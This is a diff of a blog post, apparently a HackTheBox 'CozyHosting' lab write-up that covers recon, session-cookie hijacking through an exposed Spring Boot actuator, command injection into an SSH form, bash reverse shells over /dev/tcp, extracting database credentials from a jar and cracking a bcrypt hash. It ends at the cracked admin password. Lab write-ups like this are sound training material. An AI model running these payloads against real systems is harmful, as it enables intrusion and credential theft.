@@ -1,10 +1,269 @@
 ---
-layout: encrypted
+layout: post
 title: CozyHosting HackTheBox Machine - Writeup
 categories: [HackTheBox Machines]
-tags: [hackthebox,web,hackthebox easy,linux]
+tags: [hackthebox,web,hackthebox easy,linux,cookies,command injection,java,postgres,hash cracking,suid]
 image:
   path: /images/htb/easy/cozyhosting/icon.png
-
-encrypted: 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
 ---
+
+Another machine today! This one had me quite stumped on the user flag...
+
+**Machine created by:** [commandercool](https://app.hackthebox.com/users/1005191)
+
+## Recon
+
+Starting with a nmap scan of the IP, we see 3 open ports.
+
+```
+$ sudo nmap 10.10.11.230 --top-ports 1000
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:58 AEDT
+Nmap scan report for 10.10.11.230
+Host is up (0.014s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9001/tcp open  tor-orport
+```
+
+Lets edit our `/etc/hosts` and add a new entry.
+
+```
+10.10.11.230 cozyhosting.htb
+```
+
+Looking at [cozyhosting.htb](http://cozyhosting.htb:80) we see a landing page.
+
+![Home](/images/htb/easy/cozyhosting/home.png)
+
+A directory listing with ffuf returns a few main pages:
+
+```
+[Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 10ms]
+    * FUZZ: login
+
+[Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 11ms]
+    * FUZZ: admin
+
+[Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
+    * FUZZ: logout
+
+[Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 15ms]
+    * FUZZ: error
+```
+
+Admin just redirects to the login page, logout does nothing and the error page displays an error.
+
+After looking around the page for any subdomains, technology references, bruteforcing the login, I recheck the error page and look it up and find its an error for Spring Boot!
+
+I use the [SecLists spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) with ffuf and find a few directories of interest.
+
+```
+[Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 17ms]
+    * FUZZ: actuator
+
+[Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 15ms]
+    * FUZZ: actuator/env
+
+[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 15ms]
+    * FUZZ: actuator/env/lang
+
+[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 20ms]
+    * FUZZ: actuator/env/home
+
+[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 19ms]
+    * FUZZ: actuator/env/path
+
+[Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 12ms]
+    * FUZZ: actuator/health
+
+[Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 20ms]
+    * FUZZ: actuator/beans
+
+[Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 26ms]
+    * FUZZ: actuator/mappings
+
+[Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 16ms]
+    * FUZZ: actuator/sessions
+```
+
+Looking at `/actuator/sessions` gives some data for what appears to be a session key and a username.
+
+```json
+{
+  "0A0CD0AF79B091942EFFDE86572A04B5":"kanderson"
+}
+```
+
+Editing my cookie session to be `0A0CD0AF79B091942EFFDE86572A04B5` from its original value and navigating to `/login` gives us the admin page!
+
+![Admin](/images/htb/easy/cozyhosting/admin.png)
+
+## Exploitation & Initial Access
+
+On the admin page is a SSH connection web version. I immediately try to connect to the local instance but, no dice.
+
+I then try some command injection with `;whoami;` as the username, but I encounter an error about the `@<hostname>` being an issue at the end.
+
+I decide to put my payload inside the SSH command and attempt some command injection.
+
+I had alot of trouble achieving a reverse shell and ended up looking for some other options...
+
+For whatever reason this ended up working: ``;`(/bin/bash)0>/dev/tcp/10.10.***.***/4445`` only once followed with `exec >&0` in the reverse shell connection.
+
+```
+$ nc -lvnp 4445
+Connection from 10.10.11.230:43012
+exec >&0
+whoami
+app
+```
+
+## User Flag
+
+Looking in the current directory I found a file called `cloudhosting-0.0.1.jar`, and I hosted a directory webserver to download the file locally using `python3 -m http.server` and then visiting [cozyhosting.htb:8000](http://cozyhosting.htb:8000).
+
+I extract the file using `jar xf cloudhosting-0.0.1.jar` and get some folders:
+
+```
+BOOT-INF/
+META-INF/
+org/
+```
+
+Looking inside `BOOT-INF/classes/application.properties` we see some credentials:
+
+```
+...
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+```
+
+Before logging in I make my shell more usable with `pwncat-cs`.
+
+```
+$ pwncat-cs
+[00:05:00] Welcome to pwncat 🐈!
+(local) pwncat$ listen --host=10.10.16.9 -m linux 4444
+[00:05:08] new listener created for 10.10.16.9:4444
+```
+
+and in our earlier shell we run a reverse shell: `/bin/bash -i >& /dev/tcp/10.10.16.9/4444 0>&1` and recieve a connection back in pwncat.
+
+```
+[01:26:43] 10.10.11.230:55292: registered new host w/ db
+           listener: 10.10.16.9:4444: linux session from 10.10.11.230:55292
+           established
+           all pending channels configured
+```
+
+Now let's use the postgres database:
+
+```
+(remote) app@cozyhosting:/app$ psql -h localhost -U postgres -W
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=#
+```
+
+I then connected to the `cozyhosting` database:
+
+```
+postgres=# \connect cozyhosting
+Password:
+You are now connected to database "cozyhosting" as user "postgres".
+```
+
+Inside the database are a few tables.
+
+```
+cozyhosting=# \d
+              List of relations
+ Schema |     Name     |   Type   |  Owner
+--------+--------------+----------+----------
+ public | hosts        | table    | postgres
+ public | hosts_id_seq | sequence | postgres
+ public | users        | table    | postgres
+(3 rows)
+```
+
+`users` catches my eye, so I get the data from the table.
+
+```
+cozyhosting=# SELECT * FROM users;
+   name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+```
+
+There's a hash for a user `admin`, I'll attempt to crack it with the [rockyou wordlist from SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz).
+
+```
+$ hashcat -a 0 -m 3200 admin.hash ~/Documents/Hacking/Resources/SecLists/Passwords/Leaked-Databases/rockyou.txt
+
+...
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+...
+```
+
